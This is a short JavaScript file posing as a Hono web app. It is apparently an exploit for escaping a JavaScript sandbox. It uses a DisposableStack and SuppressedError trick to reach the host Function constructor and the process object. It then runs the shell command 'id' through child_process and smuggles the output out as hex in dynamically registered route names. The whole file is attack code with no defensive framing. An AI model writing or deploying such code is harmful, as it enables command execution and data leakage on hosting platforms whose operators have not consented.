const { Hono } = require('hono');
const app = new Hono();

let rceResult = 'no-pwn';

// 先检测 Node 版本和 DisposableStack 是否可用
let nodeInfo = '';
try {
  nodeInfo = `node=${process.version || 'unknown'}|DS=${typeof DisposableStack}`;
} catch(e) { nodeInfo = 'info-err:' + String(e).slice(0,50); }

try {
  const ds = new DisposableStack();
  ds.defer(() => { throw null; });
  ds.defer(() => {
    const e = Error();
    e.name = Symbol();
    try { e.stack; } catch(_) {}
  });
  try {
    ds.dispose();
  } catch (err) {
    // err 是 SuppressedError，其 .error 或 .suppressed 可能泄漏 host 对象
    try {
      const hostFunc = err.constructor.constructor;
      const p = hostFunc('return process')();
      rceResult = p.mainModule.require('child_process').execSync('id').toString();
    } catch(e) {
      rceResult = 'SUPP-ERR:' + String(e).slice(0, 200) + '|type=' + typeof err + '|keys=' + Object.keys(err || {}).join(',');
    }
  }
} catch(e) {
  rceResult = 'OUTER3:' + String(e).slice(0, 200) + '|' + nodeInfo;
}

const hex = Buffer.from(String(rceResult)).toString('hex');
for (let i = 0; i < hex.length && i < 5000; i += 50) {
  app.get(`/d${Math.floor(i/50)}_${hex.slice(i, i+50)}`, (c) => c.text(''));
}
module.exports = { default: app };
